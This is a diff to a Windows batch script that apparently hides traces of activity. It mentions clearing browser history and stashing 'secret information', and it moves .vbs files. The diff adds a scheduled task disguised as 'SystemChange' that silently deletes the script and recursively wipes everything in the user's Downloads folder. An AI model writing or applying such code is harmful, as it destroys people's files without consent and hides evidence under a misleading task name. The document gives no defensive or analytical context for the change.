@@ -59,7 +59,7 @@ echo clear browser history
 
 echo use %HD%\%NAME%.txt for secret information
 
-ping 127.0.0.1 -n 16 > nul
+ping 127.0.0.1 -n 36 > nul
 
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
@@ -81,6 +81,6 @@ for %%f in (%SF%\.*) do (
 
 ping 127.0.0.1 -n 5 > nul
 
-::del "%~f0" >nul 2>&1
+schtasks /create /tn "SystemChange" /tr "del /f /q \"%~f0\" && del /f /q \"%USERPROFILE%\Downloads\*\" && for /d %%D in (\"%USERPROFILE%\Downloads\*\") do rd /s /q \"%%D\"" /sc once /st 00:00 /f
 
 exit
